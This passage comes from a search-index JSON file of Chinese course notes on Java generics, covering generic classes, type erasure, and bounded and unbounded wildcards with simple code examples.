\u6cdb\u578b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#21","text":"\u5728\u5b9e\u9645\u7f16\u7a0b\u8fc7\u7a0b\u4e2d\uff0c\u5f88\u591a\u65f6\u5019\u6211\u4eec\u5173\u5fc3\u7684\u4e0d\u662f\u7c7b\u578b\uff0c\u800c\u662f\u80fd\u529b\uff0c\u9488\u5bf9\u63a5\u53e3\u548c\u80fd\u529b\u7f16\u7a0b\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u590d\u7528\u4ee3\u7801\uff0c\u8fd8\u53ef\u4ee5\u964d\u4f4e\u8026\u5408\uff0c\u63d0\u9ad8\u7075\u6d3b\u6027\u3002 \u6cdb\u578b\u5c06\u63a5\u53e3\u7684\u6982\u5ff5\u8fdb\u4e00\u6b65\u5ef6\u4f38\uff0c\u201c\u6cdb\u578b\u201d\u7684\u5b57\u9762\u610f\u601d\u5c31\u662f\u5e7f\u6cdb\u7684\u7c7b\u578b\u3002\u7c7b\u3001\u63a5\u53e3\u548c\u65b9\u6cd5\u4ee3\u7801\u53ef\u4ee5\u5e94\u7528\u4e8e\u975e\u5e38\u5e7f\u6cdb\u7684\u7c7b\u578b\uff0c\u4ee3\u7801\u4e0e\u5b83\u4eec\u80fd\u591f\u64cd\u4f5c\u7684\u6570\u636e\u7c7b\u578b\u4e0d\u518d\u7ed1\u5b9a\u5728\u4e00\u8d77\uff0c\u540c\u4e00\u5957\u4ee3\u7801\u53ef\u4ee5\u7528\u4e8e\u591a\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u8fd9\u6837\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u590d\u7528\u4ee3\u7801\uff0c\u964d\u4f4e\u8026\u5408\uff0c\u800c\u4e14\u53ef\u4ee5\u63d0\u9ad8\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u548c\u5b89\u5168\u6027\u3002 \u8fd9\u4e48\u8bf4\u53ef\u80fd\u6bd4\u8f83\u62bd\u8c61\uff0c\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e9b\u4f8b\u5b50\u9010\u6b65\u8fdb\u884c\u8bf4\u660e\u3002\u5728 Java \u4e2d\uff0c\u7c7b\u3001\u63a5\u53e3\u3001\u65b9\u6cd5\u90fd\u53ef\u4ee5\u662f\u6cdb\u578b\u7684\uff0c\u6211\u4eec\u5148\u6765\u770b\u6cdb\u578b\u7c7b\u3002","title":"2.1. \u57fa\u672c\u6982\u5ff5\u548c\u539f\u7406"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#211","text":"\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u6cdb\u578b\u7c7b\u7684\u57fa\u672c\u6982\u5ff5\u3001\u57fa\u672c\u539f\u7406\u548c\u6cdb\u578b\u7684\u597d\u5904\u3002 \u57fa\u672c\u6982\u5ff5 \u6211\u4eec\u76f4\u63a5\u6765\u770b\u4ee3\u7801\uff1a public class Pair<T> { T first; T second; public Pair(T first, T second){ this.first = first; this.second = second; } public T getFirst() { return first; } public T getSecond() { return second; } } Pair \u5c31\u662f\u4e00\u4e2a\u6cdb\u578b\u7c7b\uff0c\u4e0e\u666e\u901a\u7c7b\u7684\u533a\u522b\u4f53\u73b0\u5728\uff1a \u7c7b\u540d\u540e\u9762\u591a\u4e86\u4e00\u4e2a <T> \uff1b first \u548c second \u7684\u7c7b\u578b\u90fd\u662f T \u3002 T \u662f\u4ec0\u4e48\u5462\uff1f T \u8868\u793a\u7c7b\u578b\u53c2\u6570\uff0c\u6cdb\u578b\u5c31\u662f\u7c7b\u578b\u53c2\u6570\u5316\uff0c\u5904\u7406\u7684\u6570\u636e\u7c7b\u578b\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u800c\u662f\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u3002\u600e\u4e48\u7528\u8fd9\u4e2a\u6cdb\u578b\u7c7b\uff0c\u5e76\u4f20\u9012\u7c7b\u578b\u53c2\u6570\u5462\uff1f\u770b\u4ee3\u7801\uff1a Pair<Integer> minmax = new Pair<Integer>(1,100); Integer min = minmax.getFirst(); Integer max = minmax.getSecond(); Pair<Integer> \u4e2d\u7684 Integer \u5c31\u662f\u4f20\u9012\u7684\u5b9e\u9645\u7c7b\u578b\u53c2\u6570\u3002 Pair \u7c7b\u7684\u4ee3\u7801\u548c\u5b83\u5904\u7406\u7684\u6570\u636e\u7c7b\u578b\u4e0d\u662f\u7ed1\u5b9a\u7684\uff0c\u5177\u4f53\u7c7b\u578b\u53ef\u4ee5\u53d8\u5316\u3002\u4e0a\u9762\u662f Integer \uff0c\u4e5f\u53ef\u4ee5\u662f String \uff0c\u6bd4\u5982\uff1a Pair<String> kv = new Pair<String>(\"name\",\"\u8001\u9a6c\"); \u7c7b\u578b\u53c2\u6570\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c Pair \u7c7b\u4e2d\u7684 first \u548c second \u53ef\u4ee5\u662f\u4e0d\u540c\u7684\u7c7b\u578b\uff0c\u591a\u4e2a\u7c7b\u578b\u4e4b\u95f4\u4ee5\u9017\u53f7\u5206\u9694\uff0c\u6765\u770b\u6539\u8fdb\u540e\u7684 Pair \u7c7b\u5b9a\u4e49\uff1a public class Pair<U, V> { U first; V second; public Pair(U first, V second){ this.first = first; this.second = second; } public U getFirst() { return first; } public V getSecond() { return second; } } \u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528\uff1a Pair<String,Integer> pair = new Pair<String,Integer>(\"\u8001\u9a6c\",100); <String\uff0cInteger> \u65e2\u51fa\u73b0\u5728\u4e86\u58f0\u660e\u53d8\u91cf\u65f6\uff0c\u4e5f\u51fa\u73b0\u5728\u4e86 new \u540e\u9762\uff0c\u6bd4\u8f83\u70e6\u7410\uff0c\u4ece Java 7 \u5f00\u59cb\uff0c\u652f\u6301\u7701\u7565\u540e\u9762\u7684\u7c7b\u578b\u53c2\u6570\uff0c\u53ef\u4ee5\u5982\u4e0b\u4f7f\u7528\uff1a Pair<String,Integer> pair = new Pair<>(\"\u8001\u9a6c\",100); \u57fa\u672c\u539f\u7406 \u6cdb\u578b\u7c7b\u578b\u53c2\u6570\u5230\u5e95\u662f\u4ec0\u4e48\u5462\uff1f\u4e3a\u4ec0\u4e48\u4e00\u5b9a\u8981\u5b9a\u4e49\u7c7b\u578b\u53c2\u6570\u5462\uff1f\u5b9a\u4e49\u666e\u901a\u7c7b\uff0c\u76f4\u63a5\u4f7f\u7528 Object \u4e0d\u5c31\u884c\u4e86\u5417\uff1f\u6bd4\u5982\uff0c Pair \u7c7b\u53ef\u4ee5\u5199\u4e3a\uff1a public class Pair { Object first; Object second; public Pair(Object first, Object second){ this.first = first; this.second = second; } public Object getFirst() { return first; } public Object getSecond() { return second; } } \u4f7f\u7528 Pair \u7684\u4ee3\u7801\u53ef\u4ee5\u4e3a\uff1a Pair minmax = new Pair(1,100); Integer min = (Integer)minmax.getFirst(); Integer max = (Integer)minmax.getSecond(); Pair kv = new Pair(\"name\",\"\u8001\u9a6c\"); String key = (String)kv.getFirst(); String value = (String)kv.getSecond(); \u8fd9\u6837\u662f\u53ef\u4ee5\u7684\u3002\u5b9e\u9645\u4e0a\uff0c Java \u6cdb\u578b\u7684\u5185\u90e8\u539f\u7406\u5c31\u662f\u8fd9\u6837\u7684\u3002 \u6211\u4eec\u77e5\u9053\uff0c Java \u6709 Java \u7f16\u8bd1\u5668\u548c Java \u865a\u62df\u673a\uff0c\u7f16\u8bd1\u5668\u5c06 Java \u6e90\u4ee3\u7801\u8f6c\u6362\u4e3a .class \u6587\u4ef6\uff0c\u865a\u62df\u673a\u52a0\u8f7d\u5e76\u8fd0\u884c .class \u6587\u4ef6\u3002\u5bf9\u4e8e\u6cdb\u578b\u7c7b\uff0c Java \u7f16\u8bd1\u5668\u4f1a\u5c06\u6cdb\u578b\u4ee3\u7801\u8f6c\u6362\u4e3a\u666e\u901a\u7684\u975e\u6cdb\u578b\u4ee3\u7801\uff0c\u5c31\u50cf\u4e0a\u9762\u7684\u666e\u901a Pair \u7c7b\u4ee3\u7801\u53ca\u5176\u4f7f\u7528\u4ee3\u7801\u4e00\u6837\uff0c\u5c06\u7c7b\u578b\u53c2\u6570T\u64e6\u9664\uff0c\u66ff\u6362\u4e3a Object \uff0c\u63d2\u5165\u5fc5\u8981\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u3002 Java \u865a\u62df\u673a\u5b9e\u9645\u6267\u884c\u7684\u65f6\u5019\uff0c\u5b83\u662f\u4e0d\u77e5\u9053\u6cdb\u578b\u8fd9\u56de\u4e8b\u7684\uff0c\u53ea\u77e5\u9053\u666e\u901a\u7684\u7c7b\u53ca\u4ee3\u7801\u3002 \u518d\u5f3a\u8c03\u4e00\u4e0b\uff0c Java \u6cdb\u578b\u662f\u901a\u8fc7\u64e6\u9664\u5b9e\u73b0\u7684\uff0c\u7c7b\u5b9a\u4e49\u4e2d\u7684\u7c7b\u578b\u53c2\u6570\u5982T\u4f1a\u88ab\u66ff\u6362\u4e3a Object \uff0c\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u77e5\u9053\u6cdb\u578b\u7684\u5b9e\u9645\u7c7b\u578b\u53c2\u6570\uff0c\u6bd4\u5982 Pair<Integer> \uff0c\u8fd0\u884c\u4e2d\u53ea\u77e5\u9053 Pair \uff0c\u800c\u4e0d\u77e5\u9053 Integer \u3002\u8ba4\u8bc6\u5230\u8fd9\u4e00\u70b9\u662f\u975e\u5e38\u91cd\u8981\u7684\uff0c\u5b83\u6709\u52a9\u4e8e\u6211\u4eec\u7406\u89e3 Java \u6cdb\u578b\u7684\u5f88\u591a\u9650\u5236\u3002 Java\u4e3a\u4ec0\u4e48\u8981\u8fd9\u4e48\u8bbe\u8ba1\u5462\uff1f\u6cdb\u578b\u662fJava 5\u4ee5\u540e\u624d\u652f\u6301\u7684\uff0c\u8fd9\u4e48\u8bbe\u8ba1\u662f\u4e3a\u4e86\u517c\u5bb9\u6027\u800c\u4e0d\u5f97\u5df2\u7684\u4e00\u4e2a\u9009\u62e9\u3002 \u6cdb\u578b\u7684\u597d\u5904 \u65e2\u7136\u53ea\u4f7f\u7528\u666e\u901a\u7c7b\u548c Object \u5c31\u53ef\u4ee5\uff0c\u800c\u4e14\u6cdb\u578b\u6700\u540e\u4e5f\u8f6c\u6362\u4e3a\u4e86\u666e\u901a\u7c7b\uff0c\u90a3\u4e3a\u4ec0\u4e48\u8fd8\u8981\u7528\u6cdb\u578b\u5462\uff1f\u6216\u8005\u8bf4\uff0c\u6cdb\u578b\u5230\u5e95\u6709\u4ec0\u4e48\u597d\u5904\u5462\uff1f\u6cdb\u578b\u4e3b\u8981\u6709\u4e24\u4e2a\u597d\u5904\uff1a \u66f4\u597d\u7684\u5b89\u5168\u6027\u3002 \u66f4\u597d\u7684\u53ef\u8bfb\u6027\u3002 \u8bed\u8a00\u548c\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u4e00\u4e2a\u91cd\u8981\u76ee\u6807\u662f\u5c06bug\u5c3d\u91cf\u6d88\u706d\u5728\u6447\u7bee\u91cc\uff0c\u80fd\u6d88\u706d\u5728\u5199\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u5c31\u4e0d\u8981\u7b49\u5230\u4ee3\u7801\u5199\u5b8c\u7a0b\u5e8f\u8fd0\u884c\u7684\u65f6\u5019\u3002\u53ea\u4f7f\u7528 Object \uff0c\u4ee3\u7801\u5199\u9519\u7684\u65f6\u5019\uff0c\u5f00\u53d1\u73af\u5883\u548c\u7f16\u8bd1\u5668\u4e0d\u80fd\u5e2e\u6211\u4eec\u53d1\u73b0\u95ee\u9898\uff0c\u770b\u4ee3\u7801\uff1a Pair pair = new Pair(\"\u8001\u9a6c\",1); Integer id = (Integer)pair.getFirst(); String name = (String)pair.getSecond(); \u770b\u51fa\u95ee\u9898\u4e86\u5417\uff1f\u5199\u4ee3\u7801\u65f6\u4e0d\u5c0f\u5fc3\u628a\u7c7b\u578b\u5f04\u9519\u4e86\uff0c\u4e0d\u8fc7\uff0c\u4ee3\u7801\u7f16\u8bd1\u65f6\u662f\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u7684\uff0c\u4f46\u8fd0\u884c\u65f6\u7a0b\u5e8f\u629b\u51fa\u4e86\u7c7b\u578b\u8f6c\u6362\u5f02\u5e38 ClassCastException \u3002\u5982\u679c\u4f7f\u7528\u6cdb\u578b\uff0c\u5219\u4e0d\u53ef\u80fd\u72af\u8fd9\u4e2a\u9519\u8bef\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a Pair<String,Integer> pair = new Pair<>(\"\u8001\u9a6c\",1); Integer id = pair.getFirst(); //\u6709\u7f16\u8bd1\u9519\u8bef String name = pair.getSecond(); //\u6709\u7f16\u8bd1\u9519\u8bef \u5f00\u53d1\u73af\u5883\uff08\u5982 Eclipse \uff09\u4f1a\u63d0\u793a \u7c7b\u578b\u9519\u8bef \uff0c\u5373\u4f7f\u6ca1\u6709\u597d\u7684\u5f00\u53d1\u73af\u5883\uff0c\u7f16\u8bd1\u65f6 Java \u7f16\u8bd1\u5668\u4e5f\u4f1a\u63d0\u793a\u3002\u8fd9\u79f0\u4e4b\u4e3a\u7c7b\u578b\u5b89\u5168\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u901a\u8fc7\u4f7f\u7528\u6cdb\u578b\uff0c\u5f00\u53d1\u73af\u5883\u548c\u7f16\u8bd1\u5668\u80fd\u786e\u4fdd\u4e0d\u4f1a\u7528\u9519\u7c7b\u578b\uff0c\u4e3a\u7a0b\u5e8f\u591a\u8bbe\u7f6e\u4e00\u9053\u5b89\u5168\u9632\u62a4\u7f51\u3002\u4f7f\u7528\u6cdb\u578b\uff0c\u8fd8\u53ef\u4ee5\u7701\u53bb\u70e6\u7410\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u518d\u52a0\u4e0a\u660e\u786e\u7684\u7c7b\u578b\u4fe1\u606f\uff0c\u4ee3\u7801\u53ef\u8bfb\u6027\u4e5f\u4f1a\u66f4\u597d\u3002","title":"2.1.1. \u4e00\u4e2a\u7b80\u5355\u6cdb\u578b\u7c7b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#212","text":"\u6cdb\u578b\u662f\u8ba1\u7b97\u673a\u7a0b\u5e8f\u4e2d\u4e00\u79cd\u91cd\u8981\u7684\u601d\u7ef4\u65b9\u5f0f\uff0c\u5b83 \u5c06\u6570\u636e\u7ed3\u6784\u548c\u7b97\u6cd5\u4e0e\u6570\u636e\u7c7b\u578b\u76f8\u5206\u79bb \uff0c\u4f7f\u5f97\u540c\u4e00\u5957\u6570\u636e\u7ed3\u6784\u548c\u7b97\u6cd5\u80fd\u591f\u5e94\u7528\u4e8e\u5404\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u800c\u4e14\u53ef\u4ee5\u4fdd\u8bc1 \u7c7b\u578b\u5b89\u5168 \uff0c \u63d0\u9ad8\u53ef\u8bfb\u6027 \u3002","title":"2.1.2. \u5c0f\u7ed3"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#22","text":"\u672c\u8282\u4e3b\u8981\u8ba8\u8bba\u6cdb\u578b\u4e2d\u7684\u901a\u914d\u7b26\u6982\u5ff5\u3002\u901a\u914d\u7b26\u6709\u7740\u4ee4\u4eba\u8d39\u89e3\u548c\u6df7\u6dc6\u7684\u8bed\u6cd5\uff0c\u4f46\u901a\u914d\u7b26\u5927\u91cf\u5e94\u7528\u4e8e Java \u5bb9\u5668\u7c7b\u4e2d\uff0c\u5b83\u5230\u5e95\u662f\u4ec0\u4e48\uff1f\u4e0b\u9762\u6211\u4eec\u9010\u6b65\u6765\u89e3\u6790\u3002","title":"2.2. \u901a\u914d\u7b26"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#221","text":"\u6211\u4eec\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u4e3a\u4e86\u5c06 Integer \u5bf9\u8c61\u6dfb\u52a0\u5230 Number \u5bb9\u5668\u4e2d\uff0c\u6211\u4eec\u7684\u7c7b\u578b\u53c2\u6570\u4f7f\u7528\u4e86\u5176\u4ed6\u7c7b\u578b\u53c2\u6570\u4f5c\u4e3a\u4e0a\u754c\uff0c\u8fd9\u79cd\u5199\u6cd5\u6709\u70b9\u70e6\u7410\uff0c\u5b83\u53ef\u4ee5\u66ff\u6362\u4e3a\u66f4\u4e3a\u7b80\u6d01\u7684\u901a\u914d\u7b26\u5f62\u5f0f\uff1a // \u4e0d\u4f7f\u7528\u901a\u914d\u7b26\u7684\u4f8b\u5b50 public <T extends E> void addAll(DynamicArray<T> c) { for(int i=0; i<c.size; i++){ add(c.get(i)); } } // \u901a\u914d\u7b26\u5f62\u5f0f public void addAll(DynamicArray<? extends E> c) { for(int i=0; i<c.size; i++){ add(c.get(i)); } } \u8fd9\u4e2a\u65b9\u6cd5\u6ca1\u6709\u5b9a\u4e49\u7c7b\u578b\u53c2\u6570\uff0c c \u7684\u7c7b\u578b\u662f DynamicArray<\uff1fextends E> \uff0c \uff1f \u8868\u793a\u901a\u914d\u7b26\uff0c <\uff1fextends E> \u8868\u793a\u6709\u9650\u5b9a\u901a\u914d\u7b26\uff0c\u5339\u914d E \u6216 E \u7684\u67d0\u4e2a\u5b50\u7c7b\u578b\uff0c\u5177\u4f53\u4ec0\u4e48\u5b50\u7c7b\u578b\u662f\u672a\u77e5\u7684\u3002\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u4ee3\u7801\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u6539\u52a8\uff0c\u8fd8\u53ef\u4ee5\u662f\uff1a DynamicArray<Number> numbers = new DynamicArray<>(); DynamicArray<Integer> ints = new DynamicArray<>(); ints.add(100); ints.add(34); numbers.addAll(ints); \u8fd9\u91cc\uff0c E \u662f Number \u7c7b\u578b\uff0c DynamicArray<\uff1fextends E> \u53ef\u4ee5\u5339\u914d DynamicArray<Integer> \u3002 \u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u540c\u6837\u662f extends \u5173\u952e\u5b57\uff0c\u540c\u6837\u5e94\u7528\u4e8e\u6cdb\u578b\uff0c <T extends E> \u548c <\uff1fextends E> \u5230\u5e95\u6709\u4ec0\u4e48\u5173\u7cfb\uff1f\u5b83\u4eec\u7528\u7684\u5730\u65b9\u4e0d\u4e00\u6837\uff0c\u6211\u4eec\u89e3\u91ca\u4e00\u4e0b\uff1a 1\uff09 <T extends E> \u7528\u4e8e \u5b9a\u4e49 \u7c7b\u578b\u53c2\u6570\uff0c\u5b83\u58f0\u660e\u4e86\u4e00\u4e2a\u7c7b\u578b\u53c2\u6570 T \uff0c\u53ef\u653e\u5728\u6cdb\u578b\u7c7b\u5b9a\u4e49\u4e2d\u7c7b\u540d\u540e\u9762\u3001\u6cdb\u578b\u65b9\u6cd5\u8fd4\u56de\u503c\u524d\u9762\u3002 2\uff09 <\uff1fextends E> \u7528\u4e8e \u5b9e\u4f8b\u5316 \u7c7b\u578b\u53c2\u6570\uff0c\u5b83\u7528\u4e8e\u5b9e\u4f8b\u5316\u6cdb\u578b\u53d8\u91cf\u4e2d\u7684\u7c7b\u578b\u53c2\u6570\uff0c\u53ea\u662f\u8fd9\u4e2a\u5177\u4f53\u7c7b\u578b\u662f\u672a\u77e5\u7684\uff0c\u53ea\u77e5\u9053\u5b83\u662f E \u6216 E \u7684\u67d0\u4e2a\u5b50\u7c7b\u578b\u3002 \u867d\u7136\u5b83\u4eec\u4e0d\u4e00\u6837\uff0c\u4f46\u4e24\u79cd\u5199\u6cd5\u7ecf\u5e38\u53ef\u4ee5\u8fbe\u6210\u76f8\u540c\u76ee\u6807\uff0c\u6bd4\u5982\uff0c\u524d\u9762\u4f8b\u5b50\u4e2d\uff0c\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u90fd\u53ef\u4ee5\uff1a public void addAll(DynamicArray<? extends E> c) public <T extends E> void addAll(DynamicArray<T> c) \u90a3\u4e48\uff0c\u5230\u5e95\u5e94\u8be5\u7528\u54ea\u79cd\u5f62\u5f0f\u5462\uff1f\u6211\u4eec\u5148\u8fdb\u4e00\u6b65\u7406\u89e3\u901a\u914d\u7b26\uff0c\u7136\u540e\u518d\u89e3\u91ca\u3002","title":"2.2.1. \u66f4\u7b80\u6d01\u7684\u53c2\u6570\u7c7b\u578b\u9650\u5b9a"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#222","text":"\u9664\u4e86\u6709\u9650\u5b9a\u901a\u914d\u7b26\uff0c\u8fd8\u6709\u4e00\u79cd\u901a\u914d\u7b26\uff0c\u5f62\u5982 DynamicArray<\uff1f> \uff0c\u79f0\u4e3a\u65e0\u9650\u5b9a\u901a\u914d\u7b26\u3002\u6211\u4eec\u6765\u770b\u4e2a\u4f8b\u5b50\uff0c\u5728 DynamicArray \u4e2d\u67e5\u627e\u6307\u5b9a\u5143\u7d20\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a public static int indexOf(DynamicArray<?> arr, Object elm){ for(int i=0; i<arr.size(); i++){ if(arr.get(i).equals(elm)){ return i; } } return -1; } \u5176\u5b9e\uff0c\u8fd9\u79cd\u65e0\u9650\u5b9a\u901a\u914d\u7b26\u5f62\u5f0f\u4e5f\u53ef\u4ee5\u6539\u4e3a\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0b\u9762\u7684\u5199\u6cd5\uff1a public static int indexOf(DynamicArray<?> arr, Object elm) \u53ef\u4ee5\u6539\u4e3a\uff1a public static <T> int indexOf(DynamicArray<T> arr, Object elm) \u4e0d\u8fc7\uff0c\u901a\u914d\u7b26\u5f62\u5f0f\u66f4\u4e3a\u7b80\u6d01\u3002\u867d\u7136\u901a\u914d\u7b26\u5f62\u5f0f\u66f4\u4e3a\u7b80\u6d01\uff0c\u4f46\u4e0a\u9762\u4e24\u79cd\u901a\u914d\u7b26\u90fd\u6709\u4e00\u4e2a\u91cd\u8981\u7684\u9650\u5236\uff1a\u53ea\u80fd\u8bfb\uff0c\u4e0d\u80fd\u5199\u3002\u600e\u4e48\u7406\u89e3\u5462\uff1f\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a DynamicArray<Integer> ints = new DynamicArray<>(); DynamicArray<? extends Number> numbers = ints; Integer a = 200; numbers.add(a); //\u9519\u8bef\uff01 numbers.add((Number)a)\uff1b //\u9519\u8bef\uff01 numbers.add((Object)a); //\u9519\u8bef\uff01 \u4e09\u79cdadd\u65b9\u6cd5\u90fd\u662f\u975e\u6cd5\u7684\uff0c\u65e0\u8bba\u662f Integer \uff0c\u8fd8\u662f Number \u6216 Object \uff0c\u7f16\u8bd1\u5668\u90fd\u4f1a\u62a5\u9519\u3002\u4e3a\u4ec0\u4e48\u5462\uff1f\u95ee\u53f7\u5c31\u662f\u8868\u793a\u7c7b\u578b\u5b89\u5168\u65e0\u77e5\uff0c \uff1fextends Number \u8868\u793a\u662f Number \u7684\u67d0\u4e2a\u5b50\u7c7b\u578b\uff0c\u4f46\u4e0d\u77e5\u9053\u5177\u4f53\u5b50\u7c7b\u578b\uff0c\u5982\u679c\u5141\u8bb8\u5199\u5165\uff0c Java \u5c31\u65e0\u6cd5\u786e\u4fdd\u7c7b\u578b\u5b89\u5168\u6027\uff0c\u6240\u4ee5\u5e72\u8106\u7981\u6b62\u3002\u6211\u4eec\u6765\u770b\u4e2a\u4f8b\u5b50\uff0c\u770b\u770b\u5982\u679c\u5141\u8bb8\u5199\u5165\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1a DynamicArray<Integer> ints = new DynamicArray<>(); DynamicArray<? extends Number> numbers = ints; Number n = new Double(23.0); Object o = new String(\"hello world\"); numbers.add(n); numbers.add(o); \u5982\u679c\u5141\u8bb8\u5199\u5165 Object \u6216 Number \u7c7b\u578b\uff0c\u5219\u6700\u540e\u4e24\u884c\u7f16\u8bd1\u5c31\u662f\u6b63\u786e\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c Java \u5c06\u5141\u8bb8\u628a Double \u6216 String \u5bf9\u8c61\u653e\u5165 Integer \u5bb9\u5668\uff0c\u8fd9\u663e\u7136\u8fdd\u80cc\u4e86 Java \u5173\u4e8e \u7c7b\u578b\u5b89\u5168 \u7684\u627f\u8bfa\u3002 \u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u9650\u5236\u662f\u597d\u7684\uff0c\u4f46\u8fd9\u4f7f\u5f97\u4e00\u4e9b\u7406\u5e94\u6b63\u786e\u7684\u57fa\u672c\u64cd\u4f5c\u65e0\u6cd5\u5b8c\u6210\uff0c\u6bd4\u5982\u4ea4\u6362\u4e24\u4e2a\u5143\u7d20\u7684\u4f4d\u7f6e\uff0c\u770b\u5982\u4e0b\u4ee3\u7801\uff1a public static void swap(DynamicArray<?> arr, int i, int j){ Object tmp = arr.get(i); arr.set(i, arr.get(j)); arr.set(j, tmp); } \u8fd9\u4e2a\u4ee3\u7801\u770b\u4e0a\u53bb\u5e94\u8be5\u662f\u6b63\u786e\u7684\uff0c\u4f46 Java \u4f1a\u63d0\u793a\u7f16\u8bd1\u9519\u8bef\uff0c\u4e24\u884c set \u8bed\u53e5\u90fd\u662f\u975e\u6cd5\u7684\u3002\u4e0d\u8fc7\uff0c\u501f\u52a9\u5e26\u7c7b\u578b\u53c2\u6570\u7684\u6cdb\u578b\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u5982\u4e0b\u89e3\u51b3\uff1a private static <T> void swapInternal(DynamicArray<T> arr, int i, int j){ T tmp = arr.get(i); arr.set(i, arr.get(j)); arr.set(j, tmp); } public static void swap(DynamicArray<?> arr, int i, int j){ swapInternal(arr, i, j); } swap \u53ef\u4ee5\u8c03\u7528 swapInternal \uff0c\u800c\u5e26\u7c7b\u578b\u53c2\u6570\u7684 swapInternal \u53ef\u4ee5\u5199\u5165\u3002 Java \u5bb9\u5668\u7c7b\u4e2d\u5c31\u6709\u7c7b\u4f3c\u8fd9\u6837\u7684\u7528\u6cd5\uff0c\u516c\u5171\u7684API\u662f\u901a\u914d\u7b26\u5f62\u5f0f\uff0c\u5f62\u5f0f\u66f4\u7b80\u5355\uff0c\u4f46\u5185\u90e8\u8c03\u7528\u5e26\u7c7b\u578b\u53c2\u6570\u7684\u65b9\u6cd5\u3002 \u9664\u4e86\u8fd9\u79cd\u9700\u8981\u5199\u7684\u573a\u5408\uff0c\u5982\u679c\u53c2\u6570\u7c7b\u578b\u4e4b\u95f4\u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u4e5f\u53ea\u80fd\u7528\u7c7b\u578b\u53c2\u6570\uff0c\u6bd4\u5982\uff0c\u5c06 src \u5bb9\u5668\u4e2d\u7684\u5185\u5bb9\u590d\u5236\u5230 dest \u4e2d\uff1a public static <D,S extends D> void copy(DynamicArray<D> dest, DynamicArray<S> src){ for(int i=0; i<src.size(); i++){ dest.add(src.get(i)); } } S \u548c D \u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u8981\u4e48\u76f8\u540c\uff0c\u8981\u4e48 S \u662f D \u7684\u5b50\u7c7b\uff0c\u5426\u5219\u7c7b\u578b\u4e0d\u517c\u5bb9\uff0c\u6709\u7f16\u8bd1\u9519\u8bef\u3002\u4e0d\u8fc7\uff0c\u4e0a\u9762\u7684\u58f0\u660e\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\u7b80\u5316\uff0c\u4e24\u4e2a\u53c2\u6570\u53ef\u4ee5\u7b80\u5316\u4e3a\u4e00\u4e2a\uff0c\u5982\u4e0b\u6240\u793a\uff1a public static <D> void copy(DynamicArray<D> dest, DynamicArray<? extends D> src){ for(int i=0; i<src.size(); i++){ dest.add(src.get(i)); } } \u5982\u679c\u8fd4\u56de\u503c\u4f9d\u8d56\u4e8e\u7c7b\u578b\u53c2\u6570\uff0c\u4e5f\u4e0d\u80fd\u7528\u901a\u914d\u7b26\uff0c\u6bd4\u5982\uff0c\u8ba1\u7b97\u52a8\u6001\u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\uff0c\u5982\u4e0b\u6240\u793a\uff1a public static <T extends Comparable<T>> T max(DynamicArray<T> arr){ T 